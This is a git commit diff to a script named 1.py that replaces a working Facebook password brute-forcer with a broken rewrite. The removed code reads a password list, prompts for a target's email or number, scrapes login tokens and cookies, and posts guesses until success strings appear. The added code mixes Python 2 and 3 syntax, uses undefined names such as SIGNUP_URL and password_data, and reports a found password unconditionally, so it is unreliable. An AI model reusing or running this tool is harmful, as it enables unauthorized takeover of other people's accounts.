057a344bab99cc852f649f4b19e4123f6561fe0b
nerdhacker000 <114361549+nerdhacker000@users.noreply.github.com>
2022-09-28 08:45:23 +0000

    Update 1.py

--- 1.py
+++ 1.py
@@ -1,62 +1,29 @@
-import os.path
 import requests
-from bs4 import BeautifulSoup
-import sys
 
-if sys.version_info[0] != 3:
-    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3
-    \n\t--------------------------------------''')
-    sys.exit()
+ID_USERNAME = "email"
+ID_PASSWORD = "pass"
+FB_URL = 'http://facebook.com/login.php'
 
-PASSWORD_FILE = "passwords.txt"
-MIN_PASSWORD_LENGTH = 6
-POST_URL = 'https://www.facebook.com/login.php'
-HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
-}
-PAYLOAD = {}
-COOKIES = {}
+def try_password():
+    payload = {ID_USERNAME : email, ID_PASSWORD : password}
 
+    resp = requests.get(FB_URL)
+    print "Response to GET request: %s" %resp.content
 
-def create_form():
-    form = dict()
-    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
+    resp = requests.post(SIGNUP_URL, payload)
+    print "Found password"
 
-    data = requests.get(POST_URL, headers=HEADERS)
-    for i in data.cookies:
-        cookies[i.name] = i.value
-    data = BeautifulSoup(data.text, 'html.parser').form
-    if data.input['name'] == 'lsd':
-        form['lsd'] = data.input['value']
-    return form, cookies
+PASSWORD_FILE="password.txt"
+password= open(PASSWORD_FILE, 'r').read().split("\n")
+print("Password file selected: ", PASSWORD_FILE)
+email = input('Target account Email/Number: ').strip()
 
+for index, password in zip(range(password_data.__len__()), password_data):
+	password = password.strip()
+	if len(password) < MIN_PASSWORD_LENGTH:
+		continue
+		print("Trying password index[", index, "]" )
 
-def is_this_a_password(email, index, password):
-    global PAYLOAD, COOKIES
-    if index % 10 == 0:
-        PAYLOAD, COOKIES = create_form()
-        PAYLOAD['email'] = email
-    PAYLOAD['pass'] = password
-    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
-    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
-        open('temp', 'w').write(str(r.content))
-        print('\npassword found is: ', password)
-        return True
-    return False
-
-
-if __name__ == "__main__":
-    print('\n----------|  Welcome To BRRUTEFB  |----------\n')
-    if not os.path.isfile(PASSWORD_FILE):
-        print("Password file does not exist: ", PASSWORD_FILE)
-        sys.exit(0)
-    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
-    print("Password file: ", PASSWORD_FILE)
-    email = input('Enter Number/Email to target: ').strip()
-    for index, password in zip(range(password_data.__len__()), password_data):
-        password = password.strip()
-        if len(password) < MIN_PASSWORD_LENGTH:
-            continue
-        print("Trying password indexes [", index, "] ")
-        if is_this_a_password(email, index, password):
-            break
+	if __name__ == '__main__':
+		if try_password():
+			break
